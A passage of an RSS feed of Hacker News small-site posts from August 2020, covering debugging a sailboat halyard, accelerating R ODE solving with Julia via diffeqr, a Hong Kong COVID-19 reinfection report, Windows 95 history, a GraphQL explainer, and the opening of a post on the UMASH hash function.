<p>This boat, a 420, had a mast where the halyard went through the middle of the mast, while other 420s he had sailed just had it going up the side. He needed to be able to pull it back through the mast to hoist the sail (blocking his late-afternoon sailboat launch). This was pretty easy to confirm, and after trying my first attempt with a short wire (an issue of scale…) and finding that most of the solutions online were kind of complicated (“tie the end of the rope to a bolt and use a magnet to feed it through”), we found some sturdy long wire we reused to feed the end of the rope through the mast. Afterwards, for the failsafe, he tied a few figure 8 knots at the end to ensure it wouldn’t get pulled up again.</p>
<p>I’ve been thinking a lot recently about why fixing problems with physical things is so satisfying to me, and I was thinking through how familiar the debugging experience was between this real-life fix and and most of the software debugging I do. It’s really all the same!</p>

                </section>
            </article>

            

            

            

            

        </section></div>]]>
            </description>
            <link>https://alexanderell.is/posts/debugging/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24260288</guid>
            <pubDate>Mon, 24 Aug 2020 13:13:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[GPU-Accelerated Ode Solving in R with Julia, the Language of Libraries]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24260155">thread link</a>) | @ChrisRackauckas
<br/>
August 24, 2020 | https://www.stochasticlifestyle.com/gpu-accelerated-ode-solving-in-r-with-julia-the-language-of-libraries/ | <a href="https://web.archive.org/web/*/https://www.stochasticlifestyle.com/gpu-accelerated-ode-solving-in-r-with-julia-the-language-of-libraries/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post-1449">
    <!--end post header-->
    <div>
                <p><a href="https://www.r-project.org/">R</a> is a widely used language for data science, but due to performance most of its underlying library are written in C, C++, or Fortran. <a href="https://julialang.org/">Julia</a> is a relative newcomer to the field which has busted out since its 1.0 to become <a href="https://spectrum.ieee.org/static/interactive-the-top-programming-languages-2020">one of the top 20 most used languages</a> due to its high performance libraries for scientific computing and machine learning. Julia's value proposition has been its high performance in high level language, known as solving the two language problem, which has allowed allowed the language to build <a href="https://juliahub.com/ui/Home">a robust, mature, and expansive package ecosystem</a>. While this has been a major strength for package developers, the fact remains that there are still large and robust communities in other high level languages like R and Python. Instead of spawning distracting language wars, we should ask the question: can Julia become a language of libraries to accelerate these other languages as well?</p>
<p>This is definitely not the first time this question was asked. The statistics libraries in Julia were developed by individuals like <a href="http://128.105.7.173/~bates/">Douglas Bates who built some of R's most widely used packages like lme4 and Matrix</a>. Doug had <a href="https://rpubs.com/dmbates/377897">written a blog post in 2018 showing how to get top notch performance in linear mixed effects model fitting via JuliaCall</a>. In 2018 the JuliaDiffEq organization had <a href="https://sciml.ai/news/2018/04/30/Jupyter/"> written a blog post demonstrating the use of DifferentialEquations.jl in R and Python (the Jupyter of Diffrential Equations)</a>. Now rebranded as <a href="https://sciml.ai/">SciML</a> for <a href="https://sciml.ai/roadmap/">Scientific Machine Learning</a>, we looked to expand our mission and bring <a href="https://arxiv.org/abs/2001.04385">automated model discovery and acceleration</a> include other languages like R and Python with Julia as the base.</p>
<p>With the release of <a href="https://cran.r-project.org/web/packages/diffeqr/index.html">diffeqr</a> v1.0, we can now demonstrate many advances in R through the connection to Julia. Specifically, I would like to use this blog post to showcase:</p>
<ol>
<li>The new direct wrapping interface of diffeqr</li>
<li>JIT compilation and symbolic analysis of ODEs and SDEs in R using Julia and <a href="https://github.com/SciML/ModelingToolkit.jl">ModelingToolkit.jl</a></li>
<li>GPU-accelerated simulations of ensembles using Julia's <a href="https://github.com/SciML/DiffEqGPU.jl">DiffEqGPU.jl</a></li>
</ol>
<p>Together we will demonstrate how models in R can be accelerated by 1000x without a user ever having to write anything but R.</p>
<h2>A Quick Note Before Continuing</h2>
<p>Before continuing on with showing all of the features, I wanted to ask for support so that we can continue developing these bridged libraries. Specifically, I would like to be able to support developers interested in providing a fully automated Julia installation and static compilation so that calling into Julia libraries is just as easy as any Rcpp library. To show support, the easiest thing to do is to star our libraries. The work of this blog post is build on <a href="https://github.com/SciML/DifferentialEquations.jl">DifferentialEquations.jl</a>, <a href="https://github.com/SciML/diffeqr">diffeqr</a>, <a href="https://github.com/SciML/ModelingToolkit.jl">ModelingToolkit.jl</a>, and <a href="https://github.com/SciML/DiffEqGPU.jl">DiffEqGPU.jl</a>. Thank you for your patience and now back to our regularly scheduled program.</p>
<h2>diffeqr v1.0: Direct wrappers for Differential Equation Solving in R</h2>
<p>First let me start with the new direct wrappers of differential equations solvers in R. In the previous iterations of diffeqr, we had relied on specifically designed high level functions, like "ode_solve", to compensate for the fact that one could not directly use Julia's original DifferentialEquations.jl interface directly from R. However, the new diffeqr v1.0 directly exposes the entirety of the Julia library in an easy to use framework.</p>
<p>To demonstrate this, let's see how to define the Lorenz ODE with diffeqr. In Julia's DifferentialEquations.jl, we would start by defining an "ODEProblem" that contains the initial condition u0, the time span, the parameters, and the f in terms of `u' = f(u,p,t)` that defines the derivative. In Julia, this would look like:</p>


<div><div><div><div><div><div><div><pre><span>using</span> DifferentialEquations
<span>function</span> lorenz<span>(</span>du,u,p,t<span>)</span>
  du<span>[</span><span>1</span><span>]</span> = p<span>[</span><span>1</span><span>]</span><span>*</span><span>(</span>u<span>[</span><span>2</span><span>]</span>-u<span>[</span><span>1</span><span>]</span><span>)</span>
  du<span>[</span><span>2</span><span>]</span> = u<span>[</span><span>1</span><span>]</span><span>*</span><span>(</span>p<span>[</span><span>2</span><span>]</span>-u<span>[</span><span>3</span><span>]</span><span>)</span> - u<span>[</span><span>2</span><span>]</span>
  du<span>[</span><span>3</span><span>]</span> = u<span>[</span><span>1</span><span>]</span><span>*</span>u<span>[</span><span>2</span><span>]</span> - p<span>[</span><span>3</span><span>]</span><span>*</span>u<span>[</span><span>3</span><span>]</span>
<span>end</span>
u0 = <span>[</span><span>1.0</span>,<span>1.0</span>,<span>1.0</span><span>]</span>
tspan = <span>(</span><span>0.0</span>,<span>100.0</span><span>)</span>
p = <span>[</span><span>10.0</span>,<span>28.0</span>,<span>8</span>/<span>3</span><span>]</span>
prob = ODEProblem<span>(</span>lorenz,u0,tspan,p<span>)</span>
sol = solve<span>(</span>prob,saveat=<span>1.0</span><span>)</span></pre></div></div></div></div></div></div></div>


<p>With the new diffeqr, diffeq_setup() is a function that does a few things:</p>
<ol>
<li>It instantiates a Julia process to utilize as its underlying compute engine</li>
<li>It first checks if the correct Julia libraries are installed and, if not, it installs them for you</li>
<li>Then it exposes all of the functions of DifferentialEquations.jl into its object</li>
</ol>
<p>What this means is that the following is the complete diffeqr v1.0 code for solving the Lorenz equation is:</p>


<div><div><div><div><div><div><div><pre>library(diffeqr)
de &lt;- diffeqr::diffeq_setup()
f &lt;- function(u,p,t) {
  du1 = p[1]*(u[2]-u[1])
  du2 = u[1]*(p[2]-u[3]) - u[2]
  du3 = u[1]*u[2] - p[3]*u[3]
  return(c(du1,du2,du3))
}
u0 &lt;- c(1.0,1.0,1.0)
tspan &lt;- c(0.0,100.0)
p &lt;- c(10.0,28.0,8/3)
prob &lt;- de$ODEProblem(f, u0, tspan, p)
sol &lt;- de$solve(prob,saveat=1.0)</pre></div></div></div></div></div></div></div>


<p>This then carries on through SDEs, DDEs, DAEs, and more. Through this direct exposing form, the whole library of DifferentialEquations.jl is at the finger tips of any R user, making it a truly cross-language platform.</p>
<p>(Note that the only caveat is that diffeq_setup requires that the user has already installed Julia and julia is included in the path. We hope that future developments can eliminate this need.)</p>
<h2>JIT compilation and symbolic analysis of ODEs and SDEs in R via ModelingToolkit.jl</h2>
<p>The reason for Julia is speed (well and other things, but here, SPEED!). Using the pure Julia library, we can solve the Lorenz equation 100 times in about 0.05 seconds:</p>


<div><div><div><div><div><div><div><pre>@<span>time</span> <span>for</span> i <span>in</span> <span>1</span>:<span>100</span> solve<span>(</span>prob,saveat=<span>1.0</span><span>)</span> <span>end</span>
<span>0.048237</span> seconds <span>(</span><span>156.80</span> k allocations: <span>6.842</span> MiB<span>)</span>
<span>0.048231</span> seconds <span>(</span><span>156.80</span> k allocations: <span>6.842</span> MiB<span>)</span>
<span>0.048659</span> seconds <span>(</span><span>156.80</span> k allocations: <span>6.842</span> MiB<span>)</span></pre></div></div></div></div></div></div></div>


<p>Using diffeqr connected version, we get:</p>


<div><div><div><div><div><div><div><pre>lorenz_solve &lt;- function (i){
  de$solve(prob,saveat=1.0)
}
&nbsp;
&gt; system.time({ lapply(1:100,lorenz_solve) })
   user  system elapsed
   6.81    0.02    6.83
&gt; system.time({ lapply(1:100,lorenz_solve) })
   user  system elapsed
   7.09    0.00    7.10
&gt; system.time({ lapply(1:100,lorenz_solve) })
   user  system elapsed
   6.78    0.00    6.79</pre></div></div></div></div></div></div></div>


<p>That's not good, that's about 100x difference! In <a href="https://www.stochasticlifestyle.com/why-numba-and-cython-are-not-substitutes-for-julia/">this blog post I described that interpreter overhead and context switching</a> are the main causes of this issue. We've also demonstrated that <a href="https://gist.github.com/ChrisRackauckas/cc6ac746e2dfd285c28e0584a2bfd320">ML accelerators like</a> <a href="https://gist.github.com/ChrisRackauckas/6a03e7b151c86b32d74b41af54d495c6">PyTorch</a> generally do not perform well in this regime since those kinds of accelerators rely on heavy array operations, unlike the scalarized nonlinear interactions seen in a lot of differential equation modeling. For this reason we cannot just slap any old JIT compiler onto the f call and then put it into the function since there would still be left over. So we need to do something a bit tricky.</p>
<p>In my <a href="https://www.youtube.com/watch?v=UNkXNZZ3hSw">JuliaCon 2020 talk, Automated Optimization and Parallelism in DifferentialEquations.jl</a> I demonstrated how <a href="https://github.com/SciML/ModelingToolkit.jl">ModelingToolkit.jl</a> can be used to trace functions and generate <a href="https://mtk.sciml.ai/dev/tutorials/auto_parallel/">highly optimized sparse and parallel code</a> for scientific computing all in an automated fashion. It turns out that JuliaCall can do a form of tracing on R functions, something that exploited to allow <a href="https://github.com/Non-Contradiction/autodiffr">autodiffr to automatically differentiate R code with Julia's AD libraries</a>. Thus it turns out that the same <a href="https://github.com/SciML/AutoOptimize.jl">modelingtoolkitization methods used in AutoOptimize.jl</a> can be used on a subset of R codes which includes a large majority of differential equation models.</p>
<p>In short, we can perform automated acceleration of R code by turning it into sparse parallel Julia code. This was exposed in diffeqr v1.0 as the `jitoptimize_ode(de,prob)` function (also `jitoptimize_sde(de,prob)`). Let's try it out on this example. All you need to do is give it the ODEProblem which you wish to accelerate. Let's take the last problem and turn it into a pure Julia defined problem and then time it:</p>


<div><div><div><div><div><div><div><pre>fastprob &lt;- diffeqr::jitoptimize_ode(de,prob)
fast_lorenz_solve &lt;- function (i){
  de$solve(fastprob,saveat=1.0)
}
&nbsp;
system.time({ lapply(1:100,fast_lorenz_solve) })
&nbsp;
&gt; system.time({ lapply(1:100,fast_lorenz_solve) })
   user  system elapsed
   0.05    0.00    0.04
&gt; system.time({ lapply(1:100,fast_lorenz_solve) })
   user  system elapsed
   0.07    0.00    0.06
&gt; system.time({ lapply(1:100,fast_lorenz_solve) })
   user  system elapsed
   0.07    0.00    0.06</pre></div></div></div></div></div></div></div>


<p>And there you go, an R user can get the full benefits of Julia's optimizing JIT compiler without having to write lick of Julia code! This function also did a few other things, like automatically defined the <a href="https://diffeq.sciml.ai/stable/tutorials/advanced_ode_example/#Automatic-Sparsity-Detection">Jacobian code to make implicit solving of stiff ODEs much faster as well</a>, and it can perform sparsity detection and automatically optimize computations on that.</p>
<p>To see how much of an advance this is, note that this Lorenz equation is the same from the <a href="http://desolve.r-forge.r-project.org/">deSolve examples page</a>. So let's take their example and see how well it performs:</p>


<div><div><div><div><div><div><div><pre>library(deSolve)
Lorenz &lt;- function(t, state, parameters) {
  with(as.list(c(state, parameters)), {
    dX &lt;-  a * X + Y * Z
    dY &lt;-  b * (Y - Z)
    dZ &lt;- -X * Y + c * Y - Z
    list(c(dX, dY, dZ))
  })
}
&nbsp;
parameters &lt;- c(a = -8/3, b = -10, c = 28)
state      &lt;- c(X = 1, Y = 1, Z = 1)
times      &lt;- seq(0, 100, by = 1.0)
out &lt;- ode(y = state, times = times, func = Lorenz, parms = parameters)
&nbsp;
desolve_lorenz_solve &lt;- function (i){
  state      &lt;- c(X = runif(1), Y = runif(1), Z = runif(1))
  parameters &lt;- c(a = -8/3 * runif(1), b = -10 * runif(1), c = 28 * runif(1))
  out &lt;- ode(y = state, times = times, func = Lorenz, parms = parameters)
}
&nbsp;
&gt; system.time({ lapply(1:100,desolve_lorenz_solve) })
   user  system elapsed
   5.03    0.03    5.07
&gt;
&gt; system.time({ lapply(1:100,desolve_lorenz_solve) })
   user  system elapsed
   5.42    0.00    5.44
&gt; system.time({ lapply(1:100,desolve_lorenz_solve) })
   user  system elapsed
   5.41    0.00    5.41</pre></div></div></div></div></div></div></div>


<p>Thus we see 100x acceleration over the leading R library without users having to write anything but R code. This is the true promise in action of a "language of libraries" helping to extend all other high level languages!</p>
<h2>GPU-acceleration of ODEs in R via DiffEqGPU.jl</h2>
<p>Can we go deeper? Yes we can. In many cases like in <a href="https://www.stochasticlifestyle.com/how-inexact-models-can-guide-decision-making-in-quantitative-systems-pharmacology/">optimization and sensitivity analysis of models for pharmacology</a> the users need to solve the same …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.stochasticlifestyle.com/gpu-accelerated-ode-solving-in-r-with-julia-the-language-of-libraries/">https://www.stochasticlifestyle.com/gpu-accelerated-ode-solving-in-r-with-julia-the-language-of-libraries/</a></em></p>]]>
            </description>
            <link>https://www.stochasticlifestyle.com/gpu-accelerated-ode-solving-in-r-with-julia-the-language-of-libraries/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24260155</guid>
            <pubDate>Mon, 24 Aug 2020 12:57:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hong Kong man reinfected with different strain of Covid-19]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24260152">thread link</a>) | @platz
<br/>
August 24, 2020 | https://news.rthk.hk/rthk/en/component/k2/1545589-20200824.htm | <a href="https://web.archive.org/web/*/https://news.rthk.hk/rthk/en/component/k2/1545589-20200824.htm">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>
			Researchers at the University of Hong Kong on Monday said they have proved that a Hong Kong man was infected with Covid-19 for a second time â€“ the worldâ€™s first such documented case. </p><p>

The 33-year-old IT worker was cleared of Covid-19 and discharged from a hospital in April. He tested positive for the virus again after returning from Spain earlier this month. </p><p>

Health officials at first were unsure if the man was a "persistent carrier" of the virus from his previous infection. </p><p>

But the HKU research team said genetic sequencing showed the virus strains contracted by him in April and August were â€œclearly differentâ€�. The study has been accepted by the Clinical Infectious Diseases journal, the researchers said. </p><p>

â€œMany believe that recovered Covid-19 patients have immunity against re-infection because most developed a serum neutralising antibody response. However, there is evidence that some patients have waning antibody level after a few months," the researchers said.  </p><p>

â€œOur findings suggest that the SARS-CoV-2 may persist in the global human population as is the case for other common cold-associated human coronaviruses, even if patients have acquired immunity via natural infection,â€� they said. </p><p>

They said, therefore, patients who recovered after getting Covid-19 should also wear masks and maintain social distancing.</p><p>

"Since the immunity can be short-lasting after natural infection, vaccination should also be considered for those with one episode of infection," they said.		</p></div></div>]]>
            </description>
            <link>https://news.rthk.hk/rthk/en/component/k2/1545589-20200824.htm</link>
            <guid isPermaLink="false">hacker-news-small-sites-24260152</guid>
            <pubDate>Mon, 24 Aug 2020 12:57:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[25th anniversary of Windows 95 (History and Features)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24260148">thread link</a>) | @SimonAC
<br/>
August 24, 2020 | https://techplanet.today/post/why-windows-95-is-awesome-history-and-features | <a href="https://web.archive.org/web/*/https://techplanet.today/post/why-windows-95-is-awesome-history-and-features">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
                    
                    <p>Happy birthday Windows 95. You introduced the world to the Start menu and so much more. Man, they grow up so fast. So today to celebrate this amazing occasion, we're going to time travel and take a look at the history and some of the features of one of the greatest OS releases in history.</p>
<p>Microsoft spent over $300 million on the marketing for Windows 95. It clearly paid off, so good for them. Part of this marketing effort was a commercial featuring the Rolling Stones "Start Me Up" song omitted for copyright reasons and lighting up the Empire State Building in the Windows' flag colors.</p>
<p>Then on August 24th, 1995, Microsoft held a launch party with Jay Leno, 500 journalists, 2,000 guests and 9,000 Microsoft employees. And of course Bill Gates himself. So with the marketing efforts and the hype building up when the launch officially happened, Microsoft sold 4 million copies slash licenses of Windows 95 in one day and in the first year 40 million. So now that we know that stuff, let's go back in time, even further, back to the beta days of Windows 95 with code name Chicago.<img src="https://techplanet.today/storage/posts/2020/08/5f43b49283db1.webp" alt="Why Windows 95 is AWESOME (History and Features)" data-src="/storage/posts/2020/08/5f43b49283db1.webp"></p>
<p>One of the earliest builds of Windows 95 to leak was Windows Chicago build 58s. <img src="https://techplanet.today/storage/posts/2020/08/5f43b4a3ee175.webp" alt="Why Windows 95 is AWESOME (History and Features)" width="854" height="480" data-src="/storage/posts/2020/08/5f43b4a3ee175.webp">And as you can see the task bar and the start menu were present, they were just very primitive. The file cabinet program was the replacement for the file manager we had in Windows 3 and in later builds the file cabinet became Windows Explorer, which we'll take a look at later. It's also worth noting that the minimize and maximize button started to take shape with the icons we're familiar with today, but the close button has not been implemented quite yet. To close a window, you could still use the menu in the upper left.</p>
<p>Next to the start menu, which wasn't officially labeled the start menu yet, there was a search feature and a help feature, which were eventually unified into the start menu in later builds. And the rest of the task bar wasn't fully fleshed out yet in this particular build. Today we're used to seeing running applications show up in the task bar, so we could easily switch between them. And while that feature was introduced in Windows 95, this particular build did not support that. And when you minimized windows, they wouldn't shrink into the task bar like we're used to, instead, they would transform into blocks that you could actually drag around the desktop.&nbsp;Oh, and in case you were wondering, the Dr. Watson program was the debugger for this particular beta system.</p>
<p>In a later build, running programs would appear in the task bar. <img src="https://techplanet.today/storage/posts/2020/08/5f43b4f6e127e.webp" alt="Why Windows 95 is AWESOME (History and Features)" width="854" height="480" data-src="/storage/posts/2020/08/5f43b4f6e127e.webp">And later the start menu was actually labeled start. And the three buttons we saw earlier were combined into one simple menu. <img src="https://techplanet.today/storage/posts/2020/08/5f43b50845afa.webp" alt="Why Windows 95 is AWESOME (History and Features)" width="854" height="480" data-src="/storage/posts/2020/08/5f43b50845afa.webp">And if you wanted to drag the task bar around, go nuts, put it wherever you want.</p>
<p>Build 189 was the first leaked build to be branded as Windows 95.<img src="https://techplanet.today/storage/posts/2020/08/5f43b516c76bc.webp" alt="Why Windows 95 is AWESOME (History and Features)" width="854" height="480" data-src="/storage/posts/2020/08/5f43b516c76bc.webp"> Other Windows 95 branded builds likely existed, maybe even out in the public somewhere, but to the general public build 189 was the first well known beta version of Windows to actually call itself Windows 95. And by this time the visual details of the system are nearly complete, but the start menu still looked a bit different than in the retail release.</p>
<p>Keep in mind that this particular build was compiled on September 21st, 1994 and Windows 95 didn't come out until August 24th, 1995. So we still had 11 months to go. And over that time, there were plenty of other beta builds and test releases compiled.</p>
<p>Let's hop into the 95 retail release and talk about some of its features. And my favorite thing about the Windows 95 release is so many of the features in it were kind of like the origin stories of features we still use today in Windows 10, let's take a look.</p>
<p>The biggest feature was the introduction of the start menu. <img src="https://techplanet.today/storage/posts/2020/08/5f43b55e8286f.webp" alt="Why Windows 95 is AWESOME (History and Features)" width="854" height="480" data-src="/storage/posts/2020/08/5f43b55e8286f.webp">Documents and programs could be easily accessed from a simple menu instead of having to deal with the file manager and the program manager in the previous systems. The task bar was another new feature, something we'll use today all the time in Windows. And it allowed you to easily switch between open programs. And nowadays we use the stuff without even thinking about it. So we might take it for granted, but this was a pretty big deal back then.</p>
<p>Windows Explorer was also first introduced in Windows 95. <img src="https://techplanet.today/storage/posts/2020/08/5f43b57e9cd29.webp" alt="Why Windows 95 is AWESOME (History and Features)" width="854" height="480" data-src="/storage/posts/2020/08/5f43b57e9cd29.webp">And this file browser replaced the File Manager from previous systems, the Windows Explorer featured some new right-click shortcuts for power users, which included a Quick View feature, which will let you preview contents of a file without opening that file in a program. Also introduced for the first time was the, My Computer shortcut, which allowed users to see connected devices and information about their computer. For example, they could look at their printers and although the My Computer shortcut stuck around for a long time in Windows, we don't really use it or see it much more today, but I'll tell you what we do see still... the Recycle Bin.</p>
<p>This feature was also introduced in Windows 95. If a user deletes a file, it would simply move to the Recycle Bin just in case they wanted to undelete the file later. And here's another big change something we probably still take for granted today, long file names. Previous to Windows 95, unless you were using certain Windows NT releases in the Windows' world you could only have file names with eight characters before the file extension. So you had to find creative ways to abbreviate your documents and everything. But with Windows 95, the character limit expanded to 255 characters. So good. That was pretty convenient.</p>
<p>And even though you didn't need to use DOS to start up Windows 95 anymore, like you had to with the previous Windows systems, you could still run DOS programs inside of Windows, either in full screen mode or in a window. So kudos to Microsoft for keeping that compatibility. I think that's something they do really well in the PC space. They seem to pay attention a lot to backward compatibility. But in addition to that Windows 95 also paved the way for 32-bit applications on Windows. In addition to Windows NT, which already had that. But in the more consumer space, Windows 95 helped push 32-bit apps out to users, which would potentially run much faster than their 16-bit counterparts.</p>
<p>And you probably already saw this, but the close minimize and maximize buttons are now present in the upper right of the windows, laid out in a very similar fashion to what we're used to today. And even though Internet Explorer wasn't initially bundled with Windows 95. It was available in Windows 95 with Microsoft Plus and in some other bundles, depending on where you bought your computer from. So this marked at the beginning of the Internet Explorer era, which lasted quite a long time, I mean, it's still used today, not a ton. It's starting to get phased out more, and we have a Microsoft Edge to replace it too. But man, still, kudos to you Internet Explorer, you lasted a very long time, maybe a little longer than you should have, but that's none of my business.</p>
<p>And I know I haven't covered all of the new features in Windows 95, but if I missed any that you really liked, feel free to let me know about those in the comments.</p>
<p>Some could argue that these Windows 95 features weren't anything new because other operating systems were already doing this stuff. Heck even the Macintosh had a trash feature in version one that was back in 1984, but most of the time that doesn't really matter. And Apple would even defend that. On the iPhone, they weren't the first with cut, copy, paste or with multitasking, but they still took their time to make it right. They did it well and people loved it, but they weren't the first and that's okay.</p>
<p>So even though some of these features did come into Windows a little bit later compared to other operating systems, it didn't matter because Microsoft was making their way into the homes of millions of people. And they were spreading around like wildfire. And with Windows 95, they just helped push the ease of use into the personal computing space even further.</p>
<p>Windows 95 wasn't perfect, no operating system is of course, but I think it should still be remembered as an imperative piece of personal computing history.</p>
<p><iframe src="https://techplanet.today/storage/settings/April2020/08rLYcVZG5uspJE5KPCf.jpg" width="720" height="404" allowfullscreen="allowfullscreen" data-src="https://www.youtube.com/embed/TqKF4X95e3g"></iframe></p>
                    
                </article></div>]]>
            </description>
            <link>https://techplanet.today/post/why-windows-95-is-awesome-history-and-features</link>
            <guid isPermaLink="false">hacker-news-small-sites-24260148</guid>
            <pubDate>Mon, 24 Aug 2020 12:56:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[GraphQL – Simply Explained]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24260114">thread link</a>) | @avinoth
<br/>
August 24, 2020 | https://codethumbs.com/2020/07/24/graphql-simply-explained/ | <a href="https://web.archive.org/web/*/https://codethumbs.com/2020/07/24/graphql-simply-explained/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-213">
		
	
	<div>
		
<div><ul><li><figure><img src="https://codethumbs.files.wordpress.com/2020/07/graphql.png?w=600" alt="" data-imglink=""></figure></li></ul></div>



<p>In this Simply Explained post, we are going to look at one of the hottest new tech – <a href="https://graphql.org/">GraphQL</a>.</p>



<p>The official site explains GraphQL as </p>



<p><code>[...] a query language for APIs and a runtime for fulfilling those queries with your existing data.</code></p>



<p>That feels loaded. Let’s break it down.</p>



<h2>a query language for APIs</h2>



<p>Imagine you’re running a store, maybe the only store in the city. And in your store you display items by  boxes. You have few sets of boxes which combines certain number of items. Your shelves are built in that way, you have boxes in your shelves, each containing multiple items, and a customer walks in and picks up a box and leaves. For example you have boxes like,</p>



<ul><li>Food box:<ul><li>2 chips, 1 biscuit, 4 fruits</li></ul></li><li>Hygiene box:<ul><li>1 comb, 2 perfume, 1 soap</li></ul></li></ul>



<p>and so on..</p>



<p>In your store, the customer has no way of asking for just the items they need. If they want 1 biscuit and 2 soap, they have to pick both Food box &amp; Hygiene box regardless of whether they need all the other items in it.</p>



<p>You, as a store owner, have few benefits in keeping this way. Its simple, explicit and you can easily manage the inventory. But, you also waste shelf space in keeping whole boxes instead of just the items and expend transportation costs for those as well.</p>



<p>At the same time you don’t want to display individual items as well. It’s a hassle and will waste way too much of your resources than when combined with the items of similar nature. </p>



<p>This is the traditional REST API implementation. Store is your API server, Box is your API endpoint &amp; the items in it are what we refer to as resources. You have REST endpoints, with preset structure of data you’re going to send and the API clients will call the endpoints getting the whole data set and only using what they need.</p>



<p>Now, what if there is a way for customers to pick &amp; ask you for what items they need? and a way for you to understand their ask and give what they need? You just have to slightly modify your store structure but you’ll get lots of help as we’ll see in the next section.</p>



<p>To start with, all you have to do is paste the list of items at your store’s entrance of what your boxes contains and where they’re located in this “new language”. Your customers can then read it and ask for the items. </p>



<p>This “list of items” is what we call Schema in GraphQL. With the schema in hand, your API clients can now request only the attributes &amp; resources they want instead of the whole thing. This ability of the clients to ask what they want and for the API server to understand the request is what we refer to as the “<strong>query language</strong>“. </p>



<h2>a runtime for fulfilling those data </h2>



<p>Now we just granted the ability for your customers to ask what they want, and you can understand them as well!, thanks to this new “language”.</p>



<p>But, you’re not entirely too happy. The customers, with the schema in hand can now walk in and ask for the items, but you still need help in going to the shelves, picking up the items and returning it to the customers. </p>



<p>What if now you have this “robot” that can receive the requests from your customers and go to the warehouse and pick those items and hand it over to the users? Oh and also all this robot need is for you to tell what “items” you have in your inventory to sell and where exactly its stored. The same “list of items” we spoke of in the previous section.</p>



<p>This “robot” is the <strong>GraphQL fulfillment</strong>. With the schema declared on your server with the methods to fetch your data, the GraphQL system takes care of fulfilling your API client’s requests and returning the data they requested.</p>



<h2>In summary</h2>



<p>GraphQL is a “specification” of the query language. It basically instructs both the parties involved (client &amp; server) on how to talk to each other, and for the server, how to properly fulfill the client’s requests. </p>



<h2>Conclusion</h2>



<p>GraphQL is an interesting piece of tech that has been gaining traction continuously. Developed initially by Facebook, it is becoming widely adopted and the ecosystem is also maturing by the day.</p>



<p>With the advent of API only backends and client-centric applications, GraphQL makes it seamless to put the API clients in power and to control the transaction. This also alleviates the problem of servers overextending to satisfy different client’s needs.</p>



<p>Further reading – <a href="https://graphql.org/learn">https://graphql.org/learn</a></p>




	</div><!-- .entry-content -->

	<!-- .entry-footer -->

				
</article></div>]]>
            </description>
            <link>https://codethumbs.com/2020/07/24/graphql-simply-explained/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24260114</guid>
            <pubDate>Mon, 24 Aug 2020 12:52:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[UMASH: A fast and universal enough hash function]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 4 (<a href="https://news.ycombinator.com/item?id=24260020">thread link</a>) | @pkhuong
<br/>
August 24, 2020 | https://engineering.backtrace.io/2020-08-24-umash-fast-enough-almost-universal-fingerprinting/ | <a href="https://web.archive.org/web/*/https://engineering.backtrace.io/2020-08-24-umash-fast-enough-almost-universal-fingerprinting/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><div><p>We accidentally a whole hash function… but we had a good reason!
Our
<a href="https://github.com/backtrace-labs/umash">MIT-licensed UMASH hash function</a>
is a decently fast non-cryptographic hash function that guarantees
a worst-case bound on the probability of collision
<a href="https://en.wikipedia.org/wiki/Universal_hashing#Mathematical_guarantees">between any two inputs generated independently of the UMASH parameters</a>.</p><p>On the
<a href="https://en.wikichip.org/wiki/intel/xeon_platinum/8175m">2.5 GHz Intel 8175M</a>
servers that power <a href="https://backtrace.io/">Backtrace</a>’s hosted
offering, UMASH computes a 64-bit hash for short cached inputs of up
to 64 bytes in 9-22 ns, and for longer ones at up to 22 GB/s, while
guaranteeing that two distinct inputs of at most \(s\) bytes collide
with probability less than \(\lceil s / 2048 \rceil \cdot 2^{-56}\).
If that’s not good enough, we can also reuse most of the parameters to
compute two independent UMASH values. The resulting 128-bit
<a href="https://en.wikipedia.org/wiki/Fingerprint_(computing)">fingerprint function</a>
offers a short-input latency of 9-26 ns, a peak throughput of 11.2
GB/s, and a collision probability of \(\lceil s / 2048 \rceil^2 \cdot
2^{-112}\) (better than \(2^{-70}\) for input size up to 7.5 GB).
These collision bounds hold for all inputs constructed without any
feedback about the randomly chosen UMASH parameters.</p><p>The latency on short cached inputs (9-22 ns for 64 bits, 9-26 ns for
128) is somewhat worse than the state of the art for non-cryptographic
hashes—
<a href="https://github.com/wangyi-fudan/wyhash">wyhash</a> achieves
8-15 ns and <a href="http://fastcompression.blogspot.com/2019/03/presenting-xxh3.html">xxh3</a>
8-12 ns—but still in the same ballpark. It also
compares well with latency-optimised hash functions like
<a href="https://en.wikipedia.org/wiki/Fowler%E2%80%93Noll%E2%80%93Vo_hash_function#FNV-1a_hash">FNV-1a</a>
(5-86 ns) and
<a href="https://en.wikipedia.org/wiki/MurmurHash#MurmurHash2">MurmurHash64A</a>
(7-23 ns).</p><p>Similarly, UMASH’s peak throughput (22 GB/s) does not match
the current best hash throughput (37 GB/s with
<a href="https://github.com/Cyan4973/xxHash">xxh3</a>
and <a href="https://github.com/gamozolabs/falkhash">falkhash</a>, apparently
10% higher with <a href="https://github.com/cmuratori/meow_hash">Meow hash</a>),
but does comes within a factor of two; it’s actually higher than that of
some performance-optimised hashes, like
<a href="https://github.com/wangyi-fudan/wyhash">wyhash</a> (16 GB/s) and
